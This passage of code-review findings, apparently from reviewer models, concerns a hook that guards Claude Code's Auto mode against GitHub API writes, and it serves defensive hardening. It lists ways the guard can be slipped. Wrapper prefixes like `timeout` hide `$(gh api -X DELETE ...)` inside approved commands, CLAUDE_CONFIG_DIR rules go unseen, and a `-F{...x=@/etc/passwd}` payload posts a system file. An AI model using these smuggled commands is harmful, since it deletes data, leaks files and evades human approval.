  PROBLEM: Only leading `do|then|else|elif|if|while|until|time|!|{` and `VAR=value` are stripped. Claude Code also strips wrappers such as `timeout`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob` and `xargs` before it matches allow rules. For `timeout 60 git diff "$(gh api -X DELETE orgs/o/teams/1)"` no piece fullmatches a shipped rule, so `auto_mode` stays True, the hidden `gh api` sets `shape_doubt`, and `evaluate()` returns `(None, "")`.
  WHY: Auto mode strips the wrapper, matches `Bash(git diff *)` and approves, so the hidden DELETE runs unprompted. Before this PR the command got an ask. The unwrapped form is covered. Raised in the previous round and still unfixed, and no wrapper-prefixed case exists in `_OTHER_ALLOW_RULE_SHAPE_DOUBTS`.
- .claude/hooks/gh_api_write_guard.py (twin: workflow-templates/.claude/hooks/gh_api_write_guard.py):`_settings_files()` (about lines 988-1004) | severity=MAJOR | confidence=4
  PROBLEM: It scans only the hook directory, `$CLAUDE_PROJECT_DIR/.claude` and `~/.claude`, ignoring `CLAUDE_CONFIG_DIR` and managed-policy settings. The docs say any allow rule keeps the ask, which is wider than the code.
  WHY: With `CLAUDE_CONFIG_DIR` elsewhere, a user rule such as `Bash(echo *)` is not seen, so `echo "$(gh api -X DELETE orgs/o/teams/1)"` gets no decision in Auto mode and is approved without the classifier. It affects only setups using `CLAUDE_CONFIG_DIR` or managed settings.
- HARDENING_SUGGESTIONS: add a wrapper-prefix leading regex `(?:timeout\s+\S+|nice(?:\s+-n\s*\S+)?|nohup|stdbuf(?:\s+-\S+)*|command|builtin|noglob|xargs)\s+` applied to each piece (about 4 lines per copy) plus wrapper cases in `_OTHER_ALLOW_RULE_SHAPE_DOUBTS`. Also append `CLAUDE_CONFIG_DIR` in `_settings_files()` and add it to the env-read allowlist in `test_hook_has_no_environment_escape_hatch` (about 4 lines). HARDENING_RISK_SCORE: 3

=== FINDINGS FROM minimax_minimax-m3 ===
- TASK_GAP: In Auto mode, asks that only reflect distrust of a command's shell shape return no decision, so the Auto-mode classifier judges the command (PR description), i.e. wrapper-prefixed commands should also reach the classifier. | severity=MAJOR | confidence=4
  Expected change site: `.claude/hooks/gh_api_write_guard.py` `_may_match_bash_allow_rule()` and the piece-preparation regexes (`_ALLOW_RULE_LEADING_WORDS_RE` / related stripping).
  Evidence of absence: `_ALLOW_RULE_LEADING_WORDS_RE` only strips `do|then|else|elif|if|while|until|time|!|\{`, and `_ALLOW_RULE_LEADING_ASSIGNMENTS_RE` only strips `VAR=...`. Claude Code strips `timeout`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob`, `xargs` and `env` before matching, but the guard does not. `timeout 60 git diff "$(gh api -X DELETE orgs/o/teams/1)"` does not fullmatch the compiled `Bash(git diff *)` pattern (`git diff .*`), so the guard returns no decision and the hidden DELETE runs unprompted. The previous autofix run acknowledged the gap, and wrapper test cases are absent from `_OTHER_ALLOW_RULE_SHAPE_DOUBTS`.
- TASK_GAP: A command that an allow rule could match keeps every ask in Auto mode (CLAUDE.md §23.H "Auto mode" paragraph added by this PR). | severity=MAJOR | confidence=4
  Expected change site: `.claude/hooks/gh_api_write_guard.py` `_settings_files()` (and the analogous helper in `workflow-templates/.claude/hooks/gh_api_write_guard.py`).
  Evidence of absence: `_settings_files()` enumerates only the hook's parent (`.claude/`), `$CLAUDE_PROJECT_DIR/.claude` and `~/.claude`, not `CLAUDE_CONFIG_DIR` or managed-policy paths. The new test does `monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)`, which suggests the author expected the hook to consult it. A user with `CLAUDE_CONFIG_DIR=/custom` containing `Bash(echo *)` gets `echo "$(gh api -X DELETE orgs/o/teams/1)"` approved in Auto mode without the classifier.
- TASK_GAP: Calls the guard classifies as writes still ask. That covers closing or merging, DELETE, another repository, file-backed -F, --input and unreadable calls (PR description). | severity=MAJOR | confidence=3
  Expected change site: `.claude/hooks/gh_api_write_guard.py` `evaluate()` Auto-mode hazard branch (`if hazard ... and auto_mode: shape_doubt = True`, about lines 1937-1947).
  Evidence of absence: When `_shell_rewrite_hazard(stripped_command)` reports a brace, ANSI-C or comment hazard, the Auto-mode path sets `shape_doubt = True` and returns `(None, "")` whether or not `stripped_command` contains `@`. The autofix named the `-F{'q=1','x=@/etc/passwd'}` (issue #4619) variant as a known gap and proposed `and "@" not in stripped_command`; the change was not made. In Auto mode `gh api -X POST repos/o/r/issues/1/comments -F{'q=1','x=@/etc/passwd'}` returns no decision, Claude Code approves, and `gh` sends the file in the comment body.
=== END FINDINGS FROM minimax_minimax-m3 ===
